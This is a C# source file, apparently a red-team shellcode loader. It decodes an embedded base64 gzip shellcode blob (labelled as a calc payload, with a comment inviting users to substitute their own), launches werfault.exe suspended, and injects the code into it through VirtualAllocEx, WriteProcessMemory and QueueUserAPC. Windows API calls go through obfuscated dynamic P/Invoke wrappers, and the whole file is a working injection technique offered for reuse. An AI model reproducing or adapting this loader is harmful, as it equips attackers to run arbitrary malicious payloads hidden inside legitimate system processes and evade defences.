
using System;
using System.Text;
using System.IO;
using System.IO.Compression;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Diagnostics;
using System.Reflection;
using System.Reflection.Emit;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;

namespace ProgramNamespace {

    [ComVisible(true)]
    public class Program 
    {
        public static bool YvnkRnVWc = false;

        static public void Main(String[] args) 
        { 
            if(!YvnkRnVWc) {
                Execute();
                YvnkRnVWc = true;
            }
        }

        public void Foo(string command)
        {
            if(!YvnkRnVWc) {
                Execute();
                YvnkRnVWc = true;
            }

        }

        public static long iwmpPSFUj(Stream eHjIzE, Stream DpFNKSuoTLcO) {
            byte[] JSBvrxTRnmgMkuj = new byte[2048];
            int pMUvNd;
            long aUDVzkHdEqvDsOG = 0;
            while((pMUvNd = eHjIzE.Read(JSBvrxTRnmgMkuj, 0, JSBvrxTRnmgMkuj.Length)) > 0) {
                DpFNKSuoTLcO.Write(JSBvrxTRnmgMkuj, 0, pMUvNd);
                aUDVzkHdEqvDsOG += pMUvNd;
            }
            return aUDVzkHdEqvDsOG;
        }

        public static byte[] XeNfQS(string uggMYLqmxXkI) {
            byte[] GDhENJc = Convert.FromBase64String(uggMYLqmxXkI);

            using (MemoryStream ypndiQHVCxte = new MemoryStream(GDhENJc)) {
                using (GZipStream rCMtpFZGDnxMKk = new GZipStream(ypndiQHVCxte, CompressionMode.Decompress)) {
                    using (MemoryStream onSZHoydOSwAk = new MemoryStream()) {
                        iwmpPSFUj(rCMtpFZGDnxMKk, onSZHoydOSwAk);
                        return onSZHoydOSwAk.ToArray();
                    }
                }
            }
        }

        public static object EHjOWqqQOOlfH(Type type, string NruHX, string RHnFLiMORzDfhQ, Object[] args, Type[] PHxKLjrWYkpqa) {
            AssemblyName GqeNbVG = new AssemblyName("Asm1");
            AssemblyBuilder fSPmGTnkwpzJ = AppDomain.CurrentDomain.DefineDynamicAssembly(GqeNbVG, AssemblyBuilderAccess.Run);

            ModuleBuilder tBvUJspVCNySWx = fSPmGTnkwpzJ.DefineDynamicModule("Asm2");
            MethodBuilder lHpUaIArTRZgyUt = tBvUJspVCNySWx.DefinePInvokeMethod(
                RHnFLiMORzDfhQ, 
                NruHX, 
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, 
                CallingConventions.Standard, 
                type, 
                PHxKLjrWYkpqa, 
                CallingConvention.Winapi, 
                CharSet.Ansi
            );

            lHpUaIArTRZgyUt.SetImplementationFlags(lHpUaIArTRZgyUt.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            tBvUJspVCNySWx.CreateGlobalFunctions();

            MethodInfo TijCRZLl = tBvUJspVCNySWx.GetMethod(RHnFLiMORzDfhQ);
            object res = TijCRZLl.Invoke(null, args);

            return res;
        }

        public static IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect) {
            Type[] PHxKLjrWYkpqa = { typeof(IntPtr), typeof(IntPtr), typeof(UInt32), typeof(UInt32), typeof(UInt32) };
            Object[] args = { hProcess, lpAddress, dwSize, flAllocationType, flProtect };
            object res = EHjOWqqQOOlfH(typeof(IntPtr), "kernel32.dll", "VirtualAllocEx", args, PHxKLjrWYkpqa);
            return (IntPtr)res;
        }

        public static IntPtr VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, ref uint lpflOldProtect) {
            Type[] PHxKLjrWYkpqa = { typeof(IntPtr), typeof(IntPtr), typeof(UInt32), typeof(UInt32), typeof(UInt32).MakeByRefType() };
            Object[] args = { hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect };
            object res = EHjOWqqQOOlfH(typeof(IntPtr), "kernel32.dll", "VirtualProtectEx", args, PHxKLjrWYkpqa);
            return (IntPtr)res;
        }

        public static IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect) {
            Type[] PHxKLjrWYkpqa = { typeof(IntPtr), typeof(UInt32), typeof(UInt32), typeof(UInt32) };
            Object[] args = { lpAddress, dwSize, flAllocationType, flProtect };
            object res = EHjOWqqQOOlfH(typeof(IntPtr), "kernel32.dll", "VirtualAlloc", args, PHxKLjrWYkpqa);
            return (IntPtr)res;
        }

        public static IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData) {
            Type[] PHxKLjrWYkpqa = { typeof(IntPtr), typeof(IntPtr), typeof(IntPtr) };
            Object[] args = { pfnAPC, hThread, dwData };
            object res = EHjOWqqQOOlfH(typeof(IntPtr), "kernel32.dll", "QueueUserAPC", args, PHxKLjrWYkpqa);
            return (IntPtr)res;
        }

        public static IntPtr ResumeThread(IntPtr hThread) {
            Type[] PHxKLjrWYkpqa = { typeof(IntPtr) };
            Object[] args = { hThread };
            object res = EHjOWqqQOOlfH(typeof(IntPtr), "kernel32.dll", "ResumeThread", args, PHxKLjrWYkpqa);
            return (IntPtr)res;
        }

        public static IntPtr SuspendThread(IntPtr hThread) {
            Type[] PHxKLjrWYkpqa = { typeof(IntPtr) };
            Object[] args = { hThread };
            object res = EHjOWqqQOOlfH(typeof(IntPtr), "kernel32.dll", "SuspendThread", args, PHxKLjrWYkpqa);
            return (IntPtr)res;
        }

        public static IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId) {
            Type[] PHxKLjrWYkpqa = { typeof(IntPtr), typeof(bool), typeof(int) };
            Object[] args = { processAccess, bInheritHandle, processId };
            object res = EHjOWqqQOOlfH(typeof(IntPtr), "kernel32.dll", "OpenProcess", args, PHxKLjrWYkpqa);
            return (IntPtr)res;
        }

        public static IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, UInt32 dwThreadId) {
            Type[] PHxKLjrWYkpqa = { typeof(ThreadAccess), typeof(bool), typeof(UInt32) };
            Object[] args = { dwDesiredAccess, bInheritHandle, dwThreadId };
            object res = EHjOWqqQOOlfH(typeof(IntPtr), "kernel32.dll", "OpenThread", args, PHxKLjrWYkpqa);
            return (IntPtr)res;
        }

        public static IntPtr WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref IntPtr lpNumberOfBytesWritten) {
            Type[] PHxKLjrWYkpqa = { typeof(IntPtr), typeof(IntPtr), typeof(byte[]), typeof(UInt32), typeof(IntPtr).MakeByRefType() };
            Object[] args = { hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten };
            object res = EHjOWqqQOOlfH(typeof(IntPtr), "kernel32.dll", "WriteProcessMemory", args, PHxKLjrWYkpqa);
            return (IntPtr)res;
        }

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
            string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation
        );

/*

        public static IntPtr CreateProcess(
            string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
            string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation
        ) {
            Type[] PHxKLjrWYkpqa = { 
                typeof(string), typeof(string), typeof(IntPtr), typeof(IntPtr), 
                typeof(bool), typeof(ProcessCreationFlags), typeof(IntPtr), 
                typeof(string), typeof(STARTUPINFO).MakeByRefType(), typeof(PROCESS_INFORMATION).MakeByRefType()
            };

            Object[] args = { 
                lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
                bInheritHandles, dwCreationFlags, lpEnvironment,
                lpCurrentDirectory, lpStartupInfo, lpProcessInformation
            };

            object res = EHjOWqqQOOlfH(typeof(IntPtr), "kernel32.dll", "CreateProcessW", args, PHxKLjrWYkpqa);
            return (IntPtr)res;
        }
*/

        public static bool Execute() {

            
            string DpcthVbeVKPsQ = "";

            # calc 64 in this case if you trust me - but also of course change that to your own shellcode. 
            DpcthVbeVKPsQ = "H4sIAOUt8WcC//vj0fzkw4sDDAwMjoGOAUGBYR6Gl1I9uoMSgFgCiBU8uosCPPi3e3n5Gp70MDywxiaxhklHwfHgSV5HxoOP3gY5BoJUdTvZeDBe6G7oABrk0XqgJB3IC+j2kHDpdlDwZLzwOMzj/0nHbpMOD8ZrUHOgJlg8KP3ow+yjwuFqebH0RgRQvQpQfZpjN48HkC0DZDt2swC1XXCMcIyIi4wCUpGOUR7NbxQcg/4/AHKiPLqFXob///8/1mMXIwMEePT2MgLZjrsMu/Pb/1/d/Y/P6JXjrmVT9879f9Wj+YiGDVsNV8PvB6Wsu92Fi/KzGCIdO2/9v5qcmJPMAACA90axEAEAAA==";
            byte[] mmnEIMEHWoqIPO = XeNfQS(DpcthVbeVKPsQ);                                       

            if(mmnEIMEHWoqIPO.Length == 0) {
                return false;
            }

            # where do you like to inject mate?
            string KUzaFqAOWRUf = Environment.ExpandEnvironmentVariables(@"%windir%\system32\werfault.exe");
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            CreateProcess(
                null, 
                KUzaFqAOWRUf, 
                IntPtr.Zero, 
                IntPtr.Zero, 
                false, 
                ProcessCreationFlags.CREATE_SUSPENDED, 
                IntPtr.Zero, 
                null, 
                ref si, 
                ref pi
            );

            IntPtr AlRUnVHSkXxFAB = VirtualAllocEx(
                pi.hProcess, 
                IntPtr.Zero, 
                (UInt32)mmnEIMEHWoqIPO.Length,
                MEM_COMMIT, 
                PAGE_READWRITE
            );

            IntPtr NiognfQWjhc = IntPtr.Zero;
            WriteProcessMemory(
                pi.hProcess,
                AlRUnVHSkXxFAB,
                mmnEIMEHWoqIPO,
                (UInt32)mmnEIMEHWoqIPO.Length, 
                ref NiognfQWjhc
            );

            IntPtr sht = OpenThread(
                ThreadAccess.SET_CONTEXT, 
                false, 
                (UInt32)pi.dwThreadId
            );

            uint gbIrfOa = 0;
            VirtualProtectEx(
                pi.hProcess,
                AlRUnVHSkXxFAB, 
                (UInt32)mmnEIMEHWoqIPO.Length,
                PAGE_EXECUTE_READ, 
                ref gbIrfOa
            );
            IntPtr ptr = QueueUserAPC(
                AlRUnVHSkXxFAB,
                sht,
                IntPtr.Zero
            );

            IntPtr VxHGVMhZadgsQT = pi.hThread;
            ResumeThread(VxHGVMhZadgsQT);
            return true;
        }

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;

        [Flags]
        public enum ProcessAccessFlags : uint
        {
          All = 0x001F0FFF,
          Terminate = 0x00000001,
          CreateThread = 0x00000002,
          VirtualMemoryOperation = 0x00000008,
          VirtualMemoryWrite = 0x00000020,
          DuplicateHandle = 0x00000040,
          CreateProcess = 0x000000080,
          SetInformation = 0x00000200,
          QueryInformation = 0x00000400,
          QueryLimitedInformation = 0x00001000,
          Synchronize = 0x00100000
        }

        [Flags]
        public enum ProcessCreationFlags : uint
        {
          ZERO_FLAG = 0x00000000,
          CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
          CREATE_DEFAULT_ERROR_MODE = 0x04000000,
          CREATE_NEW_CONSOLE = 0x00000010,
          CREATE_NEW_PROCESS_GROUP = 0x00000200,
          CREATE_NO_WINDOW = 0x08000000,
          CREATE_PROTECTED_PROCESS = 0x00040000,
          CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
          CREATE_SEPARATE_WOW_VDM = 0x00001000,
          CREATE_SHARED_WOW_VDM = 0x00001000,
          CREATE_SUSPENDED = 0x00000004,
          CREATE_UNICODE_ENVIRONMENT = 0x00000400,
          DEBUG_ONLY_THIS_PROCESS = 0x00000002,
          DEBUG_PROCESS = 0x00000001,
          DETACHED_PROCESS = 0x00000008,
          EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
          INHERIT_PARENT_AFFINITY = 0x00010000
        }

        public struct PROCESS_INFORMATION
        {
          public IntPtr hProcess;
          public IntPtr hThread;
          public uint dwProcessId;
          public uint dwThreadId;
        }

        public struct STARTUPINFO
        {
          public uint cb;
          public string lpReserved;
          public string lpDesktop;
          public string lpTitle;
          public uint dwX;
          public uint dwY;
          public uint dwXSize;
          public uint dwYSize;
          public uint dwXCountChars;
          public uint dwYCountChars;
          public uint dwFillAttribute;
          public uint dwFlags;
          public short wShowWindow;
          public short cbReserved2;
          public IntPtr lpReserved2;
          public IntPtr hStdInput;
          public IntPtr hStdOutput;
          public IntPtr hStdError;
        }

        [Flags]
        public enum ThreadAccess : int
        {
          TERMINATE               = (0x0001)  ,
          SUSPEND_RESUME          = (0x0002)  ,
          GET_CONTEXT             = (0x0008)  ,
          SET_CONTEXT             = (0x0010)  ,
          SET_INFORMATION         = (0x0020)  ,
          QUERY_INFORMATION       = (0x0040)  ,
          SET_THREAD_TOKEN        = (0x0080)  ,
          IMPERSONATE             = (0x0100)  ,
          DIRECT_IMPERSONATION    = (0x0200)
        }

    }

}
